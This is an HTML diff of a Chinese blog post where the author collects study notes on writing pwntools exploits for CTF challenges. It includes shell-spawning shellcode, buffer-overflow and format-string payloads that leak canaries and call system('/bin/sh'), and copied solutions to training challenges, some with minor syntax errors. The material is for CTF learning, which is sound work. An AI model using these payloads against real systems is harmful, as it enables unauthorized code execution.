@@ -16,13 +16,15 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
-<meta property="og:title" content="PWN的exp编写学习记录(待学)">
+    <meta name="description" content="整理以下exp的编写，根据网上文章结合个人去整理的。 exp的基本框架from pwn import* DEBUG # 自己设定值，在本地调试还是远程利用，不写也行 if DEBUG:     p&#x3D;process(bin路径) # 在本地调试 else:     p&#x3D;remote(ip,port) # 连接其他主机的服务，需要输入对应ip和端口号 payload&#x3D;…… # 输入payload进行操">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN的exp编写学习记录">
 <meta property="og:url" content="https://sinky.top/2022/11/10/PWN%E7%9A%84exp%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
+<meta property="og:description" content="整理以下exp的编写，根据网上文章结合个人去整理的。 exp的基本框架from pwn import* DEBUG # 自己设定值，在本地调试还是远程利用，不写也行 if DEBUG:     p&#x3D;process(bin路径) # 在本地调试 else:     p&#x3D;remote(ip,port) # 连接其他主机的服务，需要输入对应ip和端口号 payload&#x3D;…… # 输入payload进行操">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-11-10T05:32:42.447Z">
-<meta property="article:modified_time" content="2022-11-22T08:51:27.878Z">
+<meta property="article:modified_time" content="2022-11-29T08:58:23.168Z">
 <meta property="article:author" content="Sinky">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="exp">
@@ -30,7 +32,7 @@
   
   
   
-  <title>PWN的exp编写学习记录(待学) - Sinky&#39;s Blog</title>
+  <title>PWN的exp编写学习记录 - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -81,9 +83,9 @@
 
 
   
-<meta name="generator" content="Hexo 6.2.0">
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Sinky's Blog" type="application/atom+xml">
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="Sinky's Blog" type="application/atom+xml">
 </head>
 
 
@@ -198,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="PWN的exp编写学习记录(待学)"></span>
+            <span id="subtitle" data-typed-text="PWN的exp编写学习记录"></span>
           
         </div>
 
@@ -221,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          3.5k words
         
       </span>
     
@@ -232,7 +234,7 @@
         
         
         
-          1 mins
+          30 mins
         
       </span>
     
@@ -270,12 +272,50 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">PWN的exp编写学习记录(待学)</h1>
+            <h1 style="display: none">PWN的exp编写学习记录</h1>
             
             
               <div class="markdown-body">
                 
-                
+                <p>整理以下exp的编写，根据网上文章结合个人去整理的。</p>
+<h1 id="exp的基本框架"><a href="#exp的基本框架" class="headerlink" title="exp的基本框架"></a>exp的基本框架</h1><pre><code class="hljs">from pwn import*
+DEBUG # 自己设定值，在本地调试还是远程利用，不写也行
+if DEBUG:
+    p=process(bin路径) # 在本地调试
+else:
+    p=remote(ip,port) # 连接其他主机的服务，需要输入对应ip和端口号
+payload=…… # 输入payload进行操作以拿到程序的shell
+p.interactive() # 反弹shell
+</code></pre>
+<h1 id="io交互"><a href="#io交互" class="headerlink" title="io交互"></a>io交互</h1><pre><code class="hljs">recv() # 接受收到的所有字符
+recvuntil() # 接收到第一次出现str的内容为止
+recvline() # 接收一行
+send(str) # 发送str的内容
+sendline(str) # 发送str的内容并加个回车发送
+注: 当不确定io内容时，可以在exp开头加 context.log_level="debug"帮助调试。
+</code></pre>
+<h1 id="打包解包数据"><a href="#打包解包数据" class="headerlink" title="打包解包数据"></a>打包解包数据</h1><pre><code class="hljs">打包：p64() p32()
+解包：u64() u32()
+</code></pre>
+<h1 id="bin文件操作"><a href="#bin文件操作" class="headerlink" title="bin文件操作"></a>bin文件操作</h1><pre><code class="hljs">elf=ELF("binfilepath")
+libc=ELF("libcpath")
+bss_base_addr=elf.bss() # 得到程序bss段的起始位置
+PLT: write_plt=elf.plt["write"]
+GOT: write_got=elf.got["write"]
+注： 在系统ASLR关闭的情况下才会找到，否则只能得到一个偏移量
+</code></pre>
+<h1 id="exp编写练习记录"><a href="#exp编写练习记录" class="headerlink" title="exp编写练习记录"></a>exp编写练习记录</h1><p>以下都是我搜集的pwn题的exp，感觉做题然后学着写exp太慢了，所以先直接抄作业。</p>
+<h2 id="PWN题常用模板"><a href="#PWN题常用模板" class="headerlink" title="PWN题常用模板"></a>PWN题常用模板</h2><h3 id="单个发送（pwn库）"><a href="#单个发送（pwn库）" class="headerlink" title="单个发送（pwn库）"></a>单个发送（pwn库）</h3><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean"> #coding=utf<span class="hljs-number">-8</span> #中文乱码<br><span class="hljs-keyword">from</span> zio <span class="hljs-keyword">import</span> *<br>Thread=zio((<span class="hljs-string">'./pwn'</span>)) # 执行同目录下的pwn<br>Thread=write(<span class="hljs-string">'a'</span>*<span class="hljs-number">64</span>+<span class="hljs-string">'\x00\x00\x00\x01'</span>) # 输入payload<br>Thread=interact()<br><span class="hljs-comment">//p32(Address)</span><br></code></pre></td></tr></tbody></table></figure>
+<h3 id="ZIO库"><a href="#ZIO库" class="headerlink" title="ZIO库"></a>ZIO库</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> zio import *<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">Thread</span>=zio(('./pwn'))<br> #<span class="hljs-attribute">shellcode1</span>=<span class="hljs-string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span><br><span class="hljs-attribute">shellcode</span>=<span class="hljs-string">'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50'</span><br><span class="hljs-attribute">TargetAddress</span>=0x000000000040066E<br><span class="hljs-attribute">Length</span>=len(shellcode)<br><span class="hljs-attribute">payload</span>=shellcode+'\x90'*(72-Length)+p64(TargetAddress)<br>Thread.write(payload)<br>Thread.interact()<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="pwn库：有消息接收和判断的"><a href="#pwn库：有消息接收和判断的" class="headerlink" title="pwn库：有消息接收和判断的"></a>pwn库：有消息接收和判断的</h3><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>Shellcode=<span class="hljs-string">'a'</span>*<span class="hljs-number">112</span>+<span class="hljs-string">'\x5D\x86\x04\x08'</span><br>Target=process(<span class="hljs-string">'./pwn'</span>)<br>Target.sendline(Shellcode)<br>Target.recvuntil(<span class="hljs-string">':$'</span>)<br> #context.terminal=[<span class="hljs-string">'gnome-terminal'</span>,<span class="hljs-string">'-x'</span>,<span class="hljs-string">'sh'</span>,<span class="hljs-string">'-c'</span>]<br> #gdb.attach(proc.pidof(Target)[<span class="hljs-number">0</span>])<br>Target.sendline(<span class="hljs-string">'zhimakaimen'</span>)<br>Target.interactive()<br></code></pre></td></tr></tbody></table></figure>
+
+<h3 id="整数溢出型"><a href="#整数溢出型" class="headerlink" title="整数溢出型"></a>整数溢出型</h3><p>exp不理解，先不写。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2<del>default</del>baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">libc</span>=ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')<br><span class="hljs-attribute">p</span>=process("./pwn2")<br>context.terminal = [<span class="hljs-string">'gnome-terminal'</span>,<span class="hljs-string">'-x'</span>,<span class="hljs-string">'sh'</span>,<span class="hljs-string">'-c'</span>] <br>gdb.attach(proc.pidof(p)[0])       <br>p.recvuntil(<span class="hljs-string">'name:'</span>)<br>p.sendline(<span class="hljs-string">'%p.'</span><span class="hljs-number">*40</span>)     #输出字符串 <br><span class="hljs-attribute">leak_data</span>=p.recvuntil('messages:')<br><span class="hljs-attribute">address</span>=leak_data.split('.')                #将输出的地址分组 然后进行分组<br><span class="hljs-attribute">canary</span>=int(address[30],16)     #这里为什么是 第30个<br><span class="hljs-attribute">stack_addr</span>=int(address[33],16)-0x90+0x8+0x8     #这里也不懂<br><span class="hljs-attribute">put_addr</span>=int(address[22],16)-0x144               <br><span class="hljs-attribute">system_addr</span>=put_addr-(libc.symbols[<span class="hljs-string">'puts'</span>]-libc.symbols[<span class="hljs-string">'system'</span>])<br>payload =<span class="hljs-string">'a'</span><span class="hljs-number">*100</span>+p32(canary)+<span class="hljs-string">'a'</span><span class="hljs-number">*12</span>+p32(system_addr)+<span class="hljs-string">'bbbb'</span>+p32(stack_addr)+<span class="hljs-string">'/bin/sh\x00'</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
+
+<h2 id="攻防世界题解-抄作业"><a href="#攻防世界题解-抄作业" class="headerlink" title="攻防世界题解(抄作业)"></a>攻防世界题解(抄作业)</h2><h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"> #!/bin/usr/python2<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote('ip',端口)<br> # <span class="hljs-attribute">p</span>=process('born')<br><span class="hljs-attribute">birth</span>=<span class="hljs-string">'1927'</span><br><span class="hljs-attribute">name</span>=<span class="hljs-string">"aaaaaaaa"</span>+p32(0x00000786)<br>p.recvuntil(<span class="hljs-string">'What'</span>s Your Birth?<span class="hljs-string">')</span><br><span class="hljs-string">p.sendline(birth)</span><br><span class="hljs-string">p.recvuntil('</span>What<span class="hljs-string">'s Your Name?'</span>)<br>p.sendline(name)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="CGFsb"><a href="#CGFsb" class="headerlink" title="CGFsb"></a>CGFsb</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"> #!/bin/env python2<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote('ip',端口)<br><span class="hljs-attribute">pwnme_addr</span>=0x0804A068<br><span class="hljs-attribute">payload1</span>=<span class="hljs-string">'ABCD'</span><br><span class="hljs-attribute">payload2</span>=p32(pwnme_addr)+'aaaa%10$n'<br>p.recvuntil(<span class="hljs-string">'please tell me your name:\n'</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">'leave your message please:\n'</span>)<br>p.sendline(payload2)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></tbody></table></figure>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
                 
               </div>
             
@@ -301,7 +341,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>PWN的exp编写学习记录(待学)</div>
+      <div>PWN的exp编写学习记录</div>
       <div>https://sinky.top/2022/11/10/PWN的exp编写学习记录/</div>
     </div>
     <div class="license-meta">
